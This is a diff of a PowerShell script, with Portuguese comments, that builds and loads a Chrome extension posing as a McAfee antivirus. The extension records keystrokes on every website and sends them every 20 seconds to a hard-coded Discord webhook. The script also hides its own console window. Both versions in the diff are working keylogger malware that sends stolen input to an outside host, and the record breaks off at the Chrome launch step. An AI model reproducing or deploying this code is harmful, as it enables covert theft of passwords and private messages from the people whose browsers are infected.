@@ -1,29 +1,16 @@
-💻 **SCRIPT EM SHELL (para VM/teste manual)**
-```powershell
-# 🛑 Cria uma extensão do Chrome que registra teclas e envia para um Webhook
+$hookurl = "https://discord.com/api/webhooks/1374517342729404577/xbYj_R9bol3x97fqbnEVp2hB480qBCmPoFq-RkMLNEPnCpRO3d-ehrKVF1GsFJQkdD6e"
 
-$dc = 'https://discord.com/api/webhooks/1374517342729404577/xbYj_R9bol3x97fqbnEVp2hB480qBCmPoFq-RkMLNEPnCpRO3d-ehrKVF1GsFJQkdD6e'
-$hookurl = "$dc"
-
-# Oculta o console
+# Ocultar console
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
 $hwnd = (Get-Process -PID $pid).MainWindowHandle
 if ($hwnd -ne [System.IntPtr]::Zero) {
     $Type::ShowWindowAsync($hwnd, 0)
-} else {
-    $Host.UI.RawUI.WindowTitle = 'hideme'
-    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-    $hwnd = $Proc.MainWindowHandle
-    $Type::ShowWindowAsync($hwnd, 0)
 }
-
-# Se for webhook encurtado
-$hookurl = (irm $hookurl).url
 
 # Diretório da extensão
 $DirPath = "C:\Users\Public\Chrome"
-New-Item -ItemType Directory -Path $DirPath
+New-Item -ItemType Directory -Path $DirPath -Force | Out-Null
 
 # main.js
 $mainjs = @'
@@ -33,21 +20,24 @@ document.addEventListener("keydown", (event) => {
   const key = event.key;
   if (key === "Enter") { keys += "\n"; return; }
   if (key === "Backspace") { keys = keys.slice(0, keys.length - 1); return; }
-  if (key === "CapsLock" || key === "Shift") return;
-  if (key === "Control") { keys += "[Ctrl]"; return; }
+  if (key === "CapsLock" || key === "Shift" || key === "Control") return;
   if (key === "ArrowLeft") { keys += "[LeftArrow]"; return; }
   if (key === "ArrowRight") { keys += "[RightArrow]"; return; }
   if (key === "ArrowDown") { keys += "[DownArrow]"; return; }
   if (key === "ArrowUp") { keys += "[UpArrow]"; return; }
-  keys += key; saveKeysLocal();
+  keys += key;
+  saveKeysLocal();
 });
+
 window.setInterval(async () => {
   keys = getKeysLocal();
   if (keys == "") return;
   const message = `<${current}>\nLogged Keystrokes: ` + "```" + keys + "```";
   sendMessageToDiscord(discordWebhook, message);
-  keys = ""; saveKeysLocal();
+  keys = "";
+  saveKeysLocal();
 }, 20000);
+
 async function sendMessageToDiscord(webhook, msg) {
   await fetch(webhook, {
     method: "POST",
@@ -55,10 +45,16 @@ async function sendMessageToDiscord(webhook, msg) {
     body: JSON.stringify({ content: msg }),
   });
 }
-function saveKeysLocal() { localStorage.setItem("keys", keys); }
-function getKeysLocal() { return localStorage.getItem("keys"); }
+
+function saveKeysLocal() {
+  localStorage.setItem("keys", keys);
+}
+
+function getKeysLocal() {
+  return localStorage.getItem("keys");
+}
 '@
-$mainjs | Out-File -FilePath "$DirPath/main.js" -Encoding utf8 -Force
+$mainjs | Out-File -FilePath "$DirPath\main.js" -Encoding utf8 -Force
 
 # background.js
 $backgroundjs = @'
@@ -68,7 +64,7 @@ chrome.runtime.onMessage.addListener(
   }
 );
 '@
-$backgroundjs | Out-File -FilePath "$DirPath/background.js" -Encoding utf8 -Force
+$backgroundjs | Out-File -FilePath "$DirPath\background.js" -Encoding utf8 -Force
 
 # manifest.json
 $manifest = @'
@@ -77,21 +73,28 @@ $manifest = @'
   "description": "Antivirus chrome extension made by McAfee. Browse securely on the internet!",
   "version": "2.2",
   "manifest_version": 3,
-  "background": { "service_worker": "background.js" },
+  "background": {
+    "service_worker": "background.js"
+  },
   "content_scripts": [
     {
-      "matches": [ "*://*/*" ],
-      "js": [ "Webhook.js", "main.js" ]
+      "matches": [
+        "*://*/*"
+      ],
+      "js": [
+        "Webhook.js",
+        "main.js"
+      ]
     }
   ]
 }
 '@
-$manifest | Out-File -FilePath "$DirPath/manifest.json" -Encoding utf8 -Force
+$manifest | Out-File -FilePath "$DirPath\manifest.json" -Encoding utf8 -Force
 
-# webhook.js
-"const discordWebhook = `"$hookurl`";" | Out-File -FilePath "$DirPath/Webhook.js" -Encoding utf8 -Force
+# Webhook.js
+"const discordWebhook = `"$hookurl`";" | Out-File -FilePath "$DirPath\Webhook.js" -Encoding utf8 -Force
 
-# Abre Chrome e carrega extensão manualmente
+# Automatiza abertura do Chrome
 $wshell = New-Object -ComObject wscript.shell
 Start-Process chrome.exe example.com
 Start-Sleep -Seconds 7
